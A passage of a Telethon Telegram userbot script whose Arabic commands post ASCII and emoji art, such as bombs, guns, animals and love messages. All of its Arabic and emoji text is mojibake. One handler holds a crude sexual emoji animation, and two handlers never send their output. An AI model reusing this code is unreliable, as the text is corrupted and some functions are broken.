            "YO·ëå·ñá ·ó∑·ñá·ó©I·ëé ‚û°Ô∏è üß†\n\n        (> ^_^)>üß† üóë",
            "YO·ëå·ñá ·ó∑·ñá·ó©I·ëé ‚û°Ô∏è üß†\n\n           (> ^_^)>üóë",
            "YO·ëå·ñá ·ó∑·ñá·ó©I·ëé ‚û°Ô∏è üß†\n\n           <(^_^ <)üóë"
        ]

        
        message = await client.send_message(event.chat_id, message_texts[0])

        
        for text in message_texts[1:]:
            await asyncio.sleep(1)
            await message.edit(text)
            
    except Exception as e:
        await client.send_message(event.chat_id, f"‚ö†Ô∏è ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {e}")

@client.on(events.NewMessage(pattern=r"\.(ÿßÿ≠ŸÖ|ÿ∫ÿ®Ÿä)$"))  # Match either .ÿßÿ≠ŸÖ or .ÿ∫ÿ®Ÿä
async def sexy(event):
    if event.fwd_from:
        return
    if event.pattern_match.group(1) == "ÿßÿ≠ŸÖ":
        animation_interval = 2
        animation_ttl = range(0, 15)
        await event.edit("ÿ™ŸÜÿ®ŸäŸá ÿßŸÑÿπÿ±ÿ∂ ÿßÿ®ÿßÿ≠Ÿä")
        animation_chars = [
            "ŸÇÿµÿ© üíò ŸÇÿµŸäÿ±ÿ© ",
            "  üòê             üòï \n/üëï\         <üëó\ \n üëñ               /|",    
            "  üòâ          üò≥ \n/üëï\       /üëó\ \n  üëñ            /|",
            "  üòö            üòí \n/üëï\         <üëó> \n  üëñ             /|",
            "  üòç         ‚ò∫Ô∏è \n/üëï\      /üëó\ \n  üëñ          /|",
            "  üòç          üòç \n/üëï\       /üëó\ \n  üëñ           /|",
            "  üòò   üòä \n /üëï\/üëó\ \n   üëñ   /|",
            " üò≥  üòÅ \n /|\ /üëô\ \n /     / |",    
            "üòà    /üò∞\ \n<|\      üëô \n /üçÜ    / |",
            "üòÖ \n/(),‚úäüòÆ \n /\         _/\\/|",
            "üòé \n/\\_,__üò´ \n  //    //       \\",
            "üòñ \n/\\_,üí¶_üòã  \n  //         //        \\",
            "  üò≠      ‚ò∫Ô∏è \n  /|\   /(üë∂)\ \n  /!\   / \ ",
            "ÿßŸÑŸÜŸáÿßŸäÿ© ÿ™ÿ±ÿßÿßÿßÿßÿß üòÇ..."
        ]

@client.on(events.NewMessage(from_users='me', pattern='.ÿ™ÿ±ÿ≠Ÿäÿ®'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
‚îÄ‚îÄ‚îÄ‚ñÑ‚ñÄ‚ñÄ‚ñÄ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÄ‚ñÄ‚ñÄ‚ñÑ‚îÄ‚îÄ‚îÄ
‚îÄ‚îÄ‚îÄ‚ñà‚ñí‚ñí‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñí‚ñí‚ñà‚îÄ‚îÄ‚îÄ
‚îÄ‚îÄ‚îÄ‚îÄ‚ñà‚ñë‚ñë‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñë‚ñë‚ñà‚îÄ‚îÄ‚îÄ‚îÄ
‚îÄ‚ñÑ‚ñÑ‚îÄ‚îÄ‚ñà‚ñë‚ñë‚ñë‚ñÄ‚ñà‚ñÄ‚ñë‚ñë‚ñë‚ñà‚îÄ‚îÄ‚ñÑ‚ñÑ‚îÄ
‚ñà‚ñë‚ñë‚ñà‚îÄ‚ñÄ‚ñÑ‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñÑ‚ñÄ‚îÄ‚ñà‚ñë‚ñë‚ñà
‚ñà‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñà
‚ñà‚ñë‚ñë‚ï¶‚îÄ‚ï¶‚ïî‚ïó‚ï¶‚îÄ‚ïî‚ïó‚ïî‚ïó‚ïî‚ï¶‚ïó‚ïî‚ïó‚ñë‚ñë‚ñà
‚ñà‚ñë‚ñë‚ïë‚ïë‚ïë‚ï†‚îÄ‚ïë‚îÄ‚ïë‚îÄ‚ïë‚ïë‚ïë‚ïë‚ïë‚ï†‚îÄ‚ñë‚ñë‚ñà
‚ñà‚ñë‚ñë‚ïö‚ï©‚ïù‚ïö‚ïù‚ïö‚ïù‚ïö‚ïù‚ïö‚ïù‚ï©‚îÄ‚ï©‚ïö‚ïù‚ñë‚ñë‚ñà
‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÜÿßÿØŸÖ'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚†ø‚†õ‚†ã‚†â‚°â‚£â‚°õ‚£õ‚†ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚°ø‚†ã‚†Å‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚¢Ä‚£∏‚£ø‚£ø‚°ø‚†ø‚°Ø‚¢ô‚†ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚°ø‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚°Ä‚°Ä‚†Ñ‚¢Ä‚£Ä‚£â‚£â‚£â‚†Å‚†ê‚£∂‚£∂‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚°á‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Å‚£ø‚£ø‚£Ä‚†à‚†ø‚¢ü‚°õ‚†õ‚£ø‚†õ‚†õ‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚°Ü‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†à‚†Å‚†∞‚£Ñ‚£¥‚°¨‚¢µ‚£¥‚£ø‚£§‚£Ω‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚°á‚†Ñ‚¢Ä‚¢Ñ‚°Ä‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚°â‚†ª‚£ø‚°ø‚†Å‚†ò‚†õ‚°ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚°ø‚†É‚†Ñ‚†Ñ‚†à‚†ª‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚¢ò‚£ß‚£Ä‚†æ‚†ø‚†∂‚†¶‚¢≥‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£∂‚£§‚°Ä‚¢Ä‚°Ä‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†ª‚¢£‚£∂‚°í‚†∂‚¢§‚¢æ‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚°ø‚†ã‚†Ñ‚¢ò‚£ø‚£¶‚°Ä‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†â‚†õ‚†ª‚†ª‚†∫‚£º‚£ø‚†ü‚†õ‚†ø‚£ø
‚†ã‚†Å‚†Ñ‚†Ñ‚†Ñ‚¢ª‚£ø‚£ø‚£∂‚£Ñ‚°Ä‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚¢Ä‚£§‚£æ‚£ø‚°Ä‚†Ñ‚†Ñ‚†Ñ‚¢π
‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚¢ª‚£ø‚£ø‚£ø‚£∑‚°§‚†Ñ‚†∞‚°Ü‚†Ñ‚†Ñ‚†à‚†õ‚¢¶‚£Ä‚°Ä‚°Ä‚†Ñ
‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†à‚¢ø‚£ø‚†ü‚°ã‚†Ñ‚†Ñ‚†Ñ‚¢£‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†à‚†π‚£ø‚£Ä
‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†ò‚£∑‚£ø‚£ø‚£∑‚†Ñ‚†Ñ‚¢∫‚£á‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†∏‚£ø
‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†π‚£ø‚£ø‚°á‚†Ñ‚†Ñ‚†∏‚£ø‚°Ñ‚†Ñ‚†à‚†Å‚†Ñ‚†Ñ‚†Ñ‚£ø
‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚¢ª‚£ø‚°á‚†Ñ‚†Ñ‚†Ñ‚¢π‚£ß‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†ò
"""
    await event.reply(welcome_message)
    
@client.on(events.NewMessage(pattern=f"\.ŸÇŸÜÿ®ŸÑÿ©$", outgoing=True))
async def bombs(event):
    if event.fwd_from:
        return
    await event.edit("‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n")
    await asyncio.sleep(0.5)
    await event.edit("üí£üí£üí£üí£ \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n")
    await asyncio.sleep(0.5)
    await event.edit("‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \nüí£üí£üí£üí£ \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n")
    await asyncio.sleep(0.5)
    await event.edit("‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \nüí£üí£üí£üí£ \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n")
    await asyncio.sleep(0.5)
    await event.edit("‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \nüí£üí£üí£üí£ \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n")
    await asyncio.sleep(0.5)
    await event.edit("‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \nüí£üí£üí£üí£ \n")
    await asyncio.sleep(1)
    await event.edit("‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \nüí•üí•üí•üí• \n")
    await asyncio.sleep(0.5)
    await event.edit("‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \nüí•üí•üí•üí• \nüí•üí•üí•üí• \n")
    await asyncio.sleep(0.5)
    await event.edit("‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \nüòµüòµüòµüòµ \n")
    await asyncio.sleep(0.5)
    await event.edit("`RIP PLOXXX......`")
    await asyncio.sleep(2)
   
@client.on(events.NewMessage(from_users='me', pattern='.ÿ≥ÿ®ŸàŸÜÿ¨ ÿ®Ÿàÿ®'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
   ‚ï±‚ñî‚ñî‚ñî‚ñî‚ñî‚ñî‚ñî‚ñî‚ñî‚ñî‚ñî‚ñè
‚ï±‚ï≠‚ñè‚ïÆ‚ï≠‚îª‚îª‚ïÆ‚ï≠‚îª‚îª‚ïÆ ‚ï≠‚ñè 
‚ïÆ‚ï∞‚ñè‚ïØ‚îÉ‚ï≠‚ïÆ‚îÉ‚îÉ‚ï≠‚ïÆ‚îÉ ‚ï∞‚ñè 
‚ïØ‚îà‚ñè‚îà‚îó‚îª‚îª‚îõ‚îó‚îª‚îª‚îª‚ïÆ ‚ñè 
‚ï≠‚ïÆ‚ñè‚ïÆ‚îà‚îà‚îà‚îà‚îè‚îÅ‚îÅ‚îÅ‚ïØ ‚ñè
‚ï∞‚ïØ‚ñè‚ïØ‚ï∞‚î≥‚î≥‚î≥‚î≥‚î≥‚î≥‚ïØ ‚ï≠‚ñè
‚îà‚ï≠‚ñè‚ï≠‚ïÆ‚îÉ‚îó‚îõ‚îó‚îõ‚îÉ‚îà ‚ï∞‚ñè 
‚îà‚ï∞‚ñè‚ï∞‚ïØ‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ‚îà‚îà ‚ñèI'm ÿ≥ÿ®ŸÄŸàŸÜŸÄÿ¨ ÿ®ŸÄŸÄŸàÿ®
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.ÿµÿØŸÖŸá'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
‚£ø‚£ø‚£ø‚°á‚†Ñ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚°á‚†Ñ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚°á‚†Ñ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚°á‚†Ñ‚£ø‚£ø‚£ø‚°ø‚†ã‚£â‚£â‚£â‚°ô‚†ª‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚†É‚†Ñ‚†π‚†ü‚£°‚£∂‚¢ü‚£õ‚£õ‚°ª‚¢ø‚£¶‚£©‚£§‚£¨‚°â‚¢ª‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚†Ñ‚¢Ä‚¢§‚£æ‚£ø‚£ø‚£ø‚°ø‚†ø‚†ø‚†ø‚¢Æ‚°É‚£õ‚°ª‚¢ø‚†à‚£ø‚£ø‚£ø‚£ø
‚£ø‚°ü‚¢°‚£¥‚£Ø‚£ø‚£ø‚£ø‚†§‚£§‚£≠‚£∂‚£∂‚£∂‚£Æ‚£î‚°à‚†õ‚¢ì‚†¶‚†à‚¢ª‚£ø‚£ø
‚†è‚£†‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£Ø‚°™‚¢õ‚†ø‚¢ø‚£ø‚£ø‚£ø‚°ø‚£º‚£ø‚£ø‚£Æ‚£Ñ‚†ô‚£ø
‚£º‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚£æ‚°≠‚†¥‚£∂‚£∂‚£Ω‚£Ω‚£õ‚°ø‚†ø‚†ø‚†á‚£ø
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚£ù‚£õ‚¢õ‚¢ã‚£•‚£¥‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚£ø‚¢ø‚†±‚£ø‚£õ‚†æ‚£≠‚£õ‚°ø‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°Ä‚£ø‚£ø‚£ø‚£ø
 ‚†Ω‚°ª‚¢ø‚£Æ‚£Ω‚£∑‚£∂‚£Ø‚£Ω‚£≥‚†Æ‚£Ω‚£ü‚£≤‚†Ø‚¢≠‚£ø‚£õ‚°á‚£ø‚£ø‚£ø‚£ø
‚†Ñ‚†Ñ‚†à‚†ë‚†ä‚†â‚†ü‚£ª‚†ø‚£ø‚£ø‚£ø‚£∑‚£æ‚£≠‚£ø‚†∑‚†∂‚†Ç‚£¥‚£ø‚£ø‚£ø‚£ø
‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Å‚†ô‚†í‚†ô‚†Ø‚†ç‚†ô‚¢â‚£°‚£∂‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†ô‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
"""
    await event.reply(welcome_message)
    

@client.on(events.NewMessage(from_users='me', pattern='.ÿ∑ÿßÿ¶ÿ±Ÿá'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
    üî≤ ‚ñ¨‚ñ¨‚ñ¨.‚óô.‚ñ¨‚ñ¨‚ñ¨ üî≥
            ‚ïê‚ñÇ‚ñÑ‚ñÑ‚ñì‚ñÑ‚ñÑ‚ñÇ 
           ‚ó¢‚ó§    ‚ñà‚ñÄ‚ñÄ‚ñà‚ñà‚ñà‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ó¢‚ó§ 
           ‚ñà‚ñÑ ‚ñà ‚ñà‚ñÑ ‚ñà‚ñà‚ñà‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ï¨
           ‚ó•‚ñà‚ñà‚ñà‚ñà‚ñà‚ó§ 
             ‚ïê‚ïê‚ï©‚ïê‚ïê‚ï©‚ïê‚ïê 
                      ‚ï¨‚ïê‚ï¨ 
                      ‚ï¨‚ïê‚ï¨     
                      ‚ï¨‚ïê‚ï¨ ‚òª/ 
                      ‚ï¨‚ïê‚ï¨/‚ñå 
                      ‚ï¨‚ïê‚ï¨//\"""
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.ÿ≠ÿ®'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
‚î≥‚îª‚î≥‚îª‚ï≠‚îÅ‚îÅ‚îÅ‚îÅ‚ïÆ‚ï±‚ñî‚ñî‚ñî‚ï≤
‚îª‚î≥‚îª‚î≥‚îÉ‚ïØ‚ïØ‚ï≠‚îÅ‚î´‚ñè‚ï∞‚ï∞‚ï∞‚ñï
‚î≥‚îª‚î≥‚îª‚îÉ‚ïØ‚ïØ‚îÉ‚ñî‚ï∞‚îì‚ñî‚ñÇ‚ñî‚ñï‚ïÆ
‚îª‚î≥‚îª‚î≥‚ï∞‚ïÆ‚ïØ‚îÉ‚îà‚ï∞‚î´‚ï∞‚îÅ‚ïØ‚îè‚ïØ
‚î≥‚îª‚î≥‚îª‚îè‚ïØ‚ïØ‚îÉ‚ï≠‚îÅ‚ïØ‚î≥‚îÅ‚î≥‚ïØ
‚îª‚î≥‚îª‚î≥‚ï∞‚îÅ‚î≥‚ïØ‚ñî‚ï≤‚ï±‚ñî‚ï≠‚ïÆ‚ñî‚ï≤
‚î≥‚îª‚î≥‚îª‚î≥‚îª‚îÉ‚îà‚ï≤‚îà‚ï≤‚ï±‚ï≠‚ïØ‚ïÆ‚ñï
‚îª‚î≥‚îª‚î≥‚îª‚î≥‚îÉ‚îà‚ñï‚ï≤‚ñÇ‚ï±‚îà‚ï≠‚ïØ‚ï±
‚î≥‚îª‚î≥‚îª‚î≥‚îª‚îÉ'''‚îà‚îÉ‚îà‚îÉ‚îà'''‚ï∞‚ïØ
‚îª‚î≥‚îª‚î≥‚îª‚îè‚ïØ‚ñî'''‚ï∞‚îì‚î£‚îÅ‚î≥‚î´
‚î≥‚îª‚î≥‚îª‚î≥‚ï∞‚î≥‚î≥‚î≥'''‚ïØ‚îÉ‚îà‚îÉ‚îÉ
‚îª‚î≥‚îª‚î≥‚îª‚î≥‚îÉ‚îÉ‚îÉ‚îà'''‚îÉ‚îà‚îÉ‚îÉ
‚î≥‚îª‚î≥‚îª‚î≥‚îª‚îÉ‚îÉ‚îÉ'''‚îä‚îÉ‚îà‚îÉ‚îÉ
‚îª‚î≥‚îª‚î≥‚îª‚î≥‚îÉ‚îÉ‚îÉ‚îà'''‚îÉ‚îà‚îÉ‚îÉ
‚î≥‚îª‚î≥‚îª‚î≥‚îª‚î£‚ïã‚î´'''‚îä‚î£‚îÅ‚ïã‚î´
‚îª‚î≥‚îª‚î≥‚îª‚ï≠‚ïØ‚ï∞‚ï∞-‚ï≠‚ïØ‚îÅ‚ïØ.''‚ï∞‚ïÆ
"**I Love You üíï** 
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.Ÿàÿ≠ÿ¥'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ
‚ñà‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ‚ñà
‚ñà‚ñº‚ñº‚ñº‚ñº‚ñº‚ñà
‚ñà‚ñà________‚ñà‚ñå
‚ñà‚ñ≤‚ñ≤‚ñ≤‚ñ≤‚ñ≤‚ñà
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
_‚ñà‚ñà‚ñà‚ñà"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.ÿßŸÑÿ≥Ÿàÿ±ÿ≥'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
ÿßŸÑŸÖÿ∑Ÿàÿ± @X_54P

ŸÇŸÜÿßŸá ÿßŸÑÿ≥Ÿàÿ±ÿ≥ @S21S6

ŸÖÿ¨ŸÖŸàÿπÿ© ÿßŸÑÿØÿπŸÖ @e_u0e
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÇÿßÿ™ŸÑ'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
_/Ôπã\_
(“Ç`_¬¥)
<,Ô∏ª‚ï¶‚ï§‚îÄ “â - - - ü§Ø
_/Ôπã\_
"""
@client.on(events.NewMessage(from_users='me', pattern='.ÿßÿ≠ÿ®ŸÉ'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
‚ù§Ô∏è I ‚Ä¢ L O V E ‚Ä¢ Y O U
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖÿ≥ÿØÿ≥'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
‚ñë‚ñê‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñÑ
‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà 
‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñà‚ñà‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ó§ 
‚ñë‚ñÄ‚ñë‚ñê‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñå‚ñÄ‚ñà‚ñë‚ñë‚ñë‚ñà‚ñÄ‚ñë
‚ñë‚ñë‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñÄ‚ñë‚ñë
‚ñë‚ñë‚ñà‚ñì‚ñì‚ñì‚ñì‚ñì‚ñå‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë
‚ñë‚ñê‚ñà‚ñì‚ñì‚ñì‚ñì‚ñì‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë
‚ñë‚ñê‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñå‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÉŸÑÿ®'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
‚ï•‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ï≠‚îÅ‚îÅ‚ïÆ‚îÅ‚îÅ‚î≥
‚ï¢‚ï≠‚ïÆ‚ï≠‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚î´‚îÉ‚ñã‚ñã‚îÅ‚ñÖ‚î£
‚ï¢‚îÉ‚ï∞‚î´‚îà‚îà‚îà‚îà‚îà‚îÉ‚îÉ‚îà‚îà‚ï∞‚î´‚î£
‚ï¢‚ï∞‚îÅ‚î´‚îà‚îà‚îà‚îà‚îà‚ï∞‚ïØ‚ï∞‚î≥‚îÅ‚ïØ‚î£
‚ï¢‚îä‚îä‚îÉ‚îè‚î≥‚î≥‚îÅ‚îÅ‚îì‚îè‚î≥‚î´‚îä‚îä‚î£
‚ï®‚îÅ‚îÅ‚îó‚îõ‚îó‚îõ‚îÅ‚îÅ‚îó‚îõ‚îó‚îõ‚îÅ‚îÅ‚îª
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.ŸáŸÑŸà'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
‚ïî‚îì‚îè‚ï¶‚îÅ‚ï¶‚îì‚ïî‚îì‚ïî‚îÅ‚îÅ‚ïó
‚ïë‚îó‚îõ‚ïë‚îó‚ï£‚îÉ‚ïë‚îÉ‚ïëX X‚ïë
‚ïë‚îè‚îì‚ïë‚îè‚ï£‚îó‚ï£‚îó‚ï£‚ï∞‚ïØ‚ïë
‚ïö‚îõ‚îó‚ï©‚îÅ‚ï©‚îÅ‚ï©‚îÅ‚ï©‚îÅ‚îÅ‚ïù
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.ÿ´ÿπÿ®ÿßŸÜ'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
‚ñë‚ñë‚ñë‚ñë‚ñì
‚ñë‚ñë‚ñë‚ñì‚ñì
‚ñë‚ñë‚ñà‚ñì‚ñì‚ñà
‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
